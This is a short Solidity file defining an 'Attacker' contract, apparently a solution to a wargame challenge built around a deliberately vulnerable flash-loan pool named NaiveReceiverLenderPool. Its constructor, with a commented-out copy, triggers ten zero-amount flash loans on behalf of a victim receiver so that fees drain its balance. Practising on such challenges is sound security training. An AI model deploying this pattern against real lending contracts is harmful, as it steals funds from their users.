//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    constructor(IERC3156FlashBorrower receiver,NaiveReceiverLenderPool pool){
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 0,"");
        }
    }
    /*
    function att(IERC3156FlashBorrower receiver,NaiveReceiverLenderPool pool) public payable {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 0,"");
        }
    }
    */
}